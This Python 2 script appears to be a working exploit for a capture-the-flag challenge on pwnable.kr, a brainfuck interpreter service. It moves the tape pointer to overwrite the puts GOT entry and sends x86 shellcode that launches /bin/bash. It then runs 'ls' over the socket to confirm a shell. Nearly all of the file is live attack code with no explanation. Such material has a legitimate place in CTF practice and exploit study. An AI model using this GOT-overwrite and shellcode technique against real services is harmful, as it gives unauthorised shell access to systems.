import socket
import struct
from time import sleep

#IP = 'pwnable.kr'
IP = '127.0.0.1'
PORT = 9001

shellcode = '\x55\x89\xe5\x83\xec\x18\xc7\x45\xea\x2f\x62\x69\x6e\xc7\x45\xee\x2f\x62\x61\x73\x66\xc7\x45\xf2\x68\x00\xb8\x00\x4a\x80\x00\x8b\x00\x2d\x10\xa6\x02\x00\x89\x45\xf4\x83\xec\x0c\x8d\x45\xea\x50\x8b\x45\xf4\xff\xd0\x83\xc4\x10\xc9\xc3'

puts_got = 0x0804A018
p = 0x0804A0A0

def move(t):
    global p
    p0 = p
    p = t
    if t == p0:
        return ''
    if t > p0:
        return '>' * (t-p0)
    else:
        return '<' * (p0-t)

def walk(w):
    global p
    p1 = p + w
    return move(p1)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, PORT))
#sleep(1)
raw_input('PAUSE')
buf = sock.recv(1024)
print buf

a = move(puts_got)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += walk(1)
a += ','
a += '['
pos = len(a)
a += shellcode
print 'Send:', a
sock.send(a+'\n')

pos_packed = list(struct.pack('<I', p + pos))
print 'Send:', pos_packed
sock.send(struct.pack('<I', p + pos) + '\n')

sock.send('ls\n')
print 'Send: ls'

sleep(1)
buf = sock.recv(1024)
print 'Recv:', buf
sock.close()
